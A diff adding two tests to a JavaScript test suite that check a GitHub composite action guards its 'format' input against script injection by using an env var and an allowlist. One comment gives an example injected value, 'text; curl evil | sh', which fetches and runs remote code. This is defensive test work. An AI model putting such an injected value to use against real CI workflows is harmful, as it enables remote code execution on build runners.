@@ -125,6 +125,22 @@ describe('action.yml composite action', () => {
     const text = readFileSync(root('action.yml'), 'utf8');
     expect(text).toMatch(/codeql-action\/upload-sarif/);
   });
+
+  it('does not interpolate the format input directly into the run script (no injection)', () => {
+    const text = readFileSync(root('action.yml'), 'utf8');
+    // GitHub substitutes ${{ inputs.format }} into the script TEXT before the
+    // shell runs, so a value like "text; curl evil | sh" would execute. The npx
+    // line must not carry the raw expression.
+    expect(text).not.toMatch(/npx vizzy-cli@latest[^\n]*\$\{\{\s*inputs\.format\s*\}\}/);
+  });
+
+  it('passes format via an env var and validates it against an allowlist', () => {
+    const text = readFileSync(root('action.yml'), 'utf8');
+    // Env values are not expanded as script text, so the input is safe there.
+    expect(text).toMatch(/FORMAT:\s*\$\{\{\s*inputs\.format\s*\}\}/);
+    // And it is checked against the closed set before use.
+    expect(text).toMatch(/(sarif|json|text)\|(sarif|json|text)\|(sarif|json|text)/);
+  });
 });
 
 // ---------------------------------------------------------------------------
